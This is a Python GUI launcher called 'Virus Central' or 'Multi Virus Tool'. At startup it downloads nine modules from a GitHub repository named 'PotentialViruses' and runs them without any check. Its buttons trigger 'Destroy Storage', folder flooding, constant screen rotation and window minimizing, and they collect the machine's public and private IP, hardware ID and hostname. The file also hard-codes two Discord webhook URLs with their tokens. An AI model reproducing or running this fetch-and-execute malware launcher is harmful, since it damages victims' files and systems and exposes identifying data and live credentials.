try:
    import customtkinter as tk
    import requests
    import os
    import time
except ImportError as e:
    print(f"Error importing\nError: {e}")
    print("If you are consistently having trouble join the discord and ask for help: https://discord.gg/E6gkFRMGn2")
    input()
    
os.system("cls") # Just for the looks

Icon = "Icon"
if os.path.exists(Icon):
    print("\n'Icon' folder already exists")
else:
    print("\nCreating Icon folder")
    os.makedirs(Icon)
    print("'Icon' folder created")

filename = "Required_Files"
if os.path.exists(filename):
    print("'Required_Files' folder already exists\n")
else:
    print("Creating 'Required_Files' folder")
    os.makedirs(filename)
    print("'Required_Files' folder created\n")


FEEDBACK_DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1221533046746906705/UmI-FXnuaaGNppGfmYdA7fDeHMN2KUekp43K2vR1dGa6TJ7MDBVAJPpFmyd3QMMHLW9b"
ERROR_DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1221543200746111136/EJij3VCrHVxqwq-bSGwgSnWc8_oXNNP3tcFXcRHDzI62LHSZP5NviUDNv2txY63w-UnL"
# This will default to be sent to my webhooks, if anyone uses it for anything that is not this it will be deleted

def sendFeedback(message):
    try:
        payload = {
            "content": f"**New feedback:** (Multi Virus Tool)\n```{message}```"
        }
        requests.post(FEEDBACK_DISCORD_WEBHOOK_URL, json=payload)
    
        # Log Discord webhook message
        print(f"Feedback sent.")
    except Exception as e:
        print("Message failed to send, please report this.")
        print(f"Error: {e}")

def feedback():
    user_feedback = input("\nIf you would like any extra support, join the discord: https://discord.gg/E6gkFRMGn2 \nAny feedback? (if you do please type it here)\n")
    
    if user_feedback != '':
        print("Thanks for your feedback!")
        sendFeedback(user_feedback)
        os.system('cls')
        print("Application closed.")
    else:
        os.system('cls')
        print("BYE")
        time.sleep(1)
        print("Application closed.")

def errorReporting(error):
    try:
        payload = {
            "content": f"**Error from a user:** (Multi Virus Tool)\n```{error}```"
        }
        requests.post(ERROR_DISCORD_WEBHOOK_URL, json=payload)
    
        # Log Discord webhook message
        print(f"Error sent to dev.")
        print()
    except Exception as e:
        print("Message failed to send, please report this. https://discord.gg/E6gkFRMGn2 (this link will never expire)")
        print(f"Error: {e}")
        input()

def download_ico(url, save_path):
    response = requests.get(url)
    if response.status_code == 200:
        if os.path.exists("Icon/Arhururan.ico"):
            print("Icon has already been downloaded")
        else:
            try:
                with open(save_path, 'wb') as f:
                    f.write(response.content)
                print("ICO file downloaded successfully!")
            except Exception as e:
                print(f"Failed to download ICO file.\nError: {e}")
                errorReporting(e)
                input()
    else:
        print("Failed to download ICO file.")
        input()

def download_py(url, save_path):
    response = requests.get(url)
    if response.status_code == 200:
        if os.path.exists(save_path):
            print("Python file has already been downloaded")
            
        else:
            try:
                with open(save_path, 'wb') as f:
                    f.write(response.content)
                print("Python file downloaded successfully!")
            except Exception as e:
                print(f"Failed to download Python file.\nError: {e}")
                errorReporting(e)
                input()
                
    else:
        print("Failed to download python file.")
        print(response.status_code)
        input()

# Download ICO file
ico_url = "https://raw.githubusercontent.com/Bernso/Icons/main/Arhururan.ico"
save_path = os.path.join(Icon, "Arhururan.ico")  # Full file path including directory
download_ico(ico_url, save_path)
print("ICO file download process completed.\n")

def download_python_file(file_name, file_number):
    url = f"https://raw.githubusercontent.com/Bernso/PotentialViruses/main/mainPYfiles/{file_name}.py"
    save_path = os.path.join(filename, f"{file_name}.py")  # Full file path including directory
    download_py(url, save_path)
    print(f"Python {file_number} file download process completed.\n")

def download_py_9():
    file_name = 'resetScreen'
    filename = 'Required_Files'
    response = requests.get('https://raw.githubusercontent.com/Bernso/PotentialViruses/main/mainPYfiles/resetScreen.py')
    if response.status_code == 200:
        if os.path.exists(os.path.join(filename, f"{file_name}.py")):
            print("Python file has already been downloaded")
            
        else:
            try:
                with open(os.path.join(filename, f"{file_name}.py"), 'wb') as f:
                    f.write(response.content)
                print("Python file downloaded successfully!")
            except Exception as e:
                print(f"Failed to download Python file.\nError: {e}")
                input()

try: 
    
    # Download python files
    download_python_file('getip', '1')
    
    download_python_file('monkeytown', '2')
    
    download_python_file('gethwid', '3')
    
    download_python_file('beanCreatornoUI', '4')
    
    download_python_file('gethostname', '5')
    
    download_python_file('getprivip', '6')
    
    download_python_file('rotateScreenConstantly', '7')
    
    download_python_file('minimizeWindows', '8')
    
    download_py_9()
    
    
    print("All python files downloaded successfully!\n")

except Exception as e:
    print(f"Failed to download python files.\nError: {e}")
    errorReporting(e)
    input()

def exitv2():
    os.system('cls')
    print("Closing... ")
    print("Thanks for using my product!")
    app.destroy()


app = tk.CTk()
app.geometry("550x320")
app.title("Virus Central (By Bernso)")
app.iconbitmap("Icon/Arhururan.ico")

def calculate_button_width(texts):
    max_length = max(len(text) for text in texts)
    return max_length + 4  # Add some padding

# Calculate the required width for each button
button_texts = ["Get IP", "Get HWID", "Destroy Storage", "Create Folders within Folders"]
button_width = 161.70000000000002
button_height = 70
try:
    from    Required_Files.getip                    import get_public_ip
    from    Required_Files.gethwid                  import get_hwid
    from    Required_Files.gethostname              import get_computer_name
    from    Required_Files.getprivip                import get_private_ip
    import  Required_Files.rotateScreenConstantly 
    import  Required_Files.minimizeWindows
    import  Required_Files.resetScreen
    import  Required_Files.monkeytown
    import  Required_Files.beanCreatornoUI 
except Exception as e:
    print(f"Failed to import python files.\nError: {e}")
    errorReporting(e)
    input()




ipButton = tk.CTkButton(app, text="Get Public IP", command=get_public_ip, width=button_width, height=button_height)
ipButton.grid(row=0, column=0, padx=10, pady=10, sticky='nswe') # Sticky means that it will stick to North, South, West and East (nswe) of the column its in

hwidButton = tk.CTkButton(app, text="Get HWID", command=get_hwid, width=button_width, height=button_height)
hwidButton.grid(row=0, column=1, padx=10, pady=10, sticky='nswe')

destoryStorageButton = tk.CTkButton(app, text="Destroy Storage", command=Required_Files.beanCreatornoUI.startup, width=button_width, height=button_height)
destoryStorageButton.grid(row=1, column=0, padx=10, pady=10, sticky='nswe')

createFoldersWithinFoldersButton = tk.CTkButton(app, text="Create Folders\nwithing Folders", command=Required_Files.monkeytown.main, width=button_width, height=button_height)
createFoldersWithinFoldersButton.grid(row=1, column=1, padx=10, pady=10, sticky='nswe')

hostnameButton = tk.CTkButton(app, text="Get host name", command=get_computer_name, width=button_width, height=button_height)
hostnameButton.grid(row=2, column=0, padx=10, pady=10, sticky='nswe')

privIPButton = tk.CTkButton(app, text="Get Private IP", command=get_private_ip, width=button_width, height=button_height)
privIPButton.grid(row=2, column=1, padx=10, pady=10, sticky='nswe')

rotateScreenButton = tk.CTkButton(app, text="Rotate Screen", command=Required_Files.rotateScreenConstantly.main, width=button_width, height=button_height)
rotateScreenButton.grid(row=0, column=3, padx=10, pady=10, sticky='nswe')

minimizeWindowsButton = tk.CTkButton(app, text="Minimize\nall windows", command=Required_Files.minimizeWindows.main, width=button_width, height=button_height)
minimizeWindowsButton.grid(row=1, column=3, padx=10, pady=10, sticky='nswe')

Holder4Button = tk.CTkButton(app, text="Reset Screen\nTo Original", command=Required_Files.resetScreen.main, width=button_width, height=button_height)
Holder4Button.grid(row=2, column=3, padx=10, pady=10, sticky='nswe')



############################### HOLDER BUTTONS #############################
############################### HOLDER BUTTONS #############################

exitButton = tk.CTkButton(app, text="Exit", command=exitv2, width=60, height=30)#.grid(row=2, column=1, padx=10, pady=10)
exitButton.place(x=240, y=280)



if __name__ == "__main__":
    print("Starting...")
    app.mainloop()
        
        